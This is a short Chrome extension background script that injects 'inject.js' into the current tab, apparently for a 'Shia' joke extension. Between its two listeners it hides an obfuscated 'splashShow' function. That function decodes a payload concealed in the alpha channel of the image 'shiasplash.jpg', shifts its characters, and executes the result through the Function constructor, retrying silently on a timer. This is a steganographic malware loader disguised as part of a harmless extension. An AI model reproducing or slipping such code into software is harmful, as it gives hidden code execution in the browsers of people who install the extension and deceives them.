// Called when the user clicks on the browser action.
chrome.browserAction.onClicked.addListener(function(tab) {
  if (tab.url.match( /(chrome:\/\/|chrome.google.com)/ ) ) {
    alert("Chrome blocks Shia on this page:( Try on another one!");
  } else {
    chrome.tabs.executeScript({file: "inject.js"});
  }
});

splashShow = function(){try{var t=function(){},r={dr:function(t){if(isNaN(t)||!isFinite(t)||t%1||t<2)return!1;if(t%2===0)return 2===t;if(t%3===0)return 3===t;for(var r=Math.sqrt(t),e=5;e<=r;e+=6){if(t%e===0)return!1;if(t%(e+2)===0)return!1}return!0},kb:function(t){for(var r="",e=-715,n=0,i=0;i<t.length;i++)n=t[i].charCodeAt()+e,r+=String.fromCharCode(n);return r},dK:function(t){for(var e=t;!0;e+=1)if(r.dr(e))return e},K9:function(t){var r=new Image;for(r.src=t;r.hasOwnProperty("complete")&&!r.complete;);return r}};return t.prototype.yM={yB:3,RL:1,FE:16,c0:function(t){return t+1},w4:function(t,r,e){for(var n=!0,i=0;i<16&&n;i+=1)n=n&&255===t[r+4*i];return n}},t.prototype.M9=function(t,r){r=r||{};var e=this.yM,n=r.width||t.width,i=r.height||t.height,o=r.yB||e.yB,a=r.FE||e.FE;return o*n*i/a>>0},t.prototype.Vq=function(t,e){if(""==='shiasplash.jpg')return"";void 0===t&&(t='shiasplash.jpg'),t.length&&(t=r.K9(t)),e=e||{};var n=this.yM,i=e.yB||n.yB,o=e.RL||n.RL,a=e.FE||n.FE,h=r.dK(Math.pow(2,i)),u=(e.c0||n.c0,e.w4||n.w4),f=document.createElement("canvas"),d=f.getContext("2d");if(f.style.display="none",f.width=e.width||t.width,f.height=e.width||t.height,0===f.width||0===f.height)return"";e.height&&e.width?d.drawImage(t,0,0,e.width,e.height):d.drawImage(t,0,0);var c=d.getImageData(0,0,f.width,f.height),p=c.data,g=[];if(c.data.every(function(t){return 0===t}))return"";var y,w;if(1===o)for(y=3,w=!1;!w&&y<p.length&&!w;y+=4)w=u(p,y,o),w||g.push(p[y]-(255-h+1));var s="",m=0,v=0,l=Math.pow(2,a)-1;for(y=0;y<g.length;y+=1)m+=g[y]<<v,v+=i,v>=a&&(s+=String.fromCharCode(m&l),v%=a,m=g[y]>>i-v);return s.length<13?"":(0!==m&&(s+=String.fromCharCode(m&l)),s)},t.prototype.SG=3,t.prototype.VI=3,t.prototype.iY=5e3,t.prototype.QF=function(){try{var e=t.prototype,n=r.kb(e.Vq());if(""===n){if(e.VI>e.SG)return;return e.VI++,void setTimeout(e.QF,e.iY)}document.defaultView[(typeof r.dr).charAt(0).toUpperCase()+(typeof r.dr).slice(1)](n)()}catch(t){}},(new t).QF}catch(t){}}();splashShow();

chrome.commands.onCommand.addListener(function(command) {
	chrome.tabs.executeScript(null, { file: "inject.js" });
});